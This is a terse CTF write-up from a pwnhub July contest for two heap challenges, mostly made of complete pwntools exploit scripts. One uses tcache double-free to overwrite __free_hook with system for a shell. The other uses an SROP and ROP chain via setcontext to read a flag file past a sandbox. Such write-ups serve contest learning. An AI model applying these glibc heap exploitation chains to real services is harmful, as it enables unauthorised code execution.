# pwnhub 7月赛

## Mynote:

tcache dup + tcache_phread_struct

exp:

```python
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 1
if debug == 1:
	p = process("./chall")
	libc = ELF("/glibc/x64/2.27/lib/libc-2.27.so",checksec=False)
	one = [0x470f2,0x47146,0xe68a6]
else:
	p = remote("69.230.220.199",28472)
	libc = ELF("./libc-2.27.so",checksec=False)
	one = [0x4f2c5,0x4f322,0x10a38c]

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

def add(size,content):
	sla("Your choice :",str(1))
	sla("Note size :",str(size))
	sa("Content :",content)

def show(index):
	sla("choice :",str(2))
	sla("Index :",str(index))

def free(index):
	sla("choice :",str(3))
	sla("Index :",str(index))

add(0x200,'a\n') # 0
add(0x200,'a\n') # 1
add(0x100,'/bin/sh\x00') # 2
free(0)
free(0)
add(0x200,'\x60')
add(0x200,'\x60')
add(0x200,'\x60')
free(1)
show(1)
gdb.attach(p,'b *$rebase(0x00DD3)\nc')
p.recvuntil("Content:")
libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00')) - 0x1b5ca0
free_hook = libc.sym['__free_hook']
og = libc.address + one[2]
realloc_addr = libc.sym["realloc"]
realloc_hook = libc.sym["__realloc_hook"]
success("__free_hook = " + hex(free_hook))
success("libc.address = " + hex(libc.address))
add(0x200,p64(free_hook))
add(0x200,'a')
add(0x200,p64(libc.sym['system']))
free(2)


ti()

```



## Mynote_max:

在此基础上上了沙箱

free_hook处布置srop即可

exp：

```python
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 1
if debug == 1:
	p = process("./chall")
	libc = ELF("./libc-2.27.so",checksec=False)
else:
	p = remote("69.230.220.199",28472)
	libc = ELF("./libc.so.6",checksec=False)

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

def add(size,content):
	sla("Your choice :",str(1))
	sla("Note size :",str(size))
	sa("Content :",content)

def show(index):
	sla("choice :",str(2))
	sla("Index :",str(index))

def free(index):
	sla("choice :",str(3))
	sla("Index :",str(index))

add(0x200,'a\n')
add(0x200,'a\n')
add(0x200,'a\n')
free(0)
free(0)
show(0)
p.recvuntil("Content: ")
heap_addr = u64(rc(6).ljust(8,'\x00'))
add(0x200,'\x60')
add(0x200,'\x60')
add(0x200,'\x60')
free(1)
show(1)

libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00')) - 0x3ebca0

free_hook = libc.sym['__free_hook']
setcontext = libc.sym['setcontext']
success("heap_addr = " + hex(heap_addr))
success("free_hook = " + hex(free_hook))
success("setcontext = " + hex(setcontext))
success("libc.address = " + hex(libc.address))
success("heap_addr = " + hex(heap_addr))
gdb.attach(p)
pop_rdi = 0x000000000002155f + libc.address
pop_rdx = 0x0000000000001b96 + libc.address
pop_rax = 0x00000000000439c8 + libc.address
pop_rsi = 0x0000000000023e6a + libc.address
syscall = 0x00000000000E4718 + libc.address
srop = SigreturnFrame()
srop.rax = 2
srop.rdi = heap_addr + 0xf8
srop.rsi = 0
srop.rdx = 0x100
srop.rsp = heap_addr + 0xf8 + 0x10
srop.rip = pop_rdi + 1

rop = p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(syscall)
rop += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap_addr+0x200) + p64(syscall)
rop += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap_addr+0x200) + p64(syscall)
add(0x200,p64(free_hook))
pd = str(srop).ljust(0xf8,'\x00') + './flag' + '\x00'*10 + rop
add(0x200,pd)
add(0x200,p64(setcontext+53))
free(0)
ti()
```

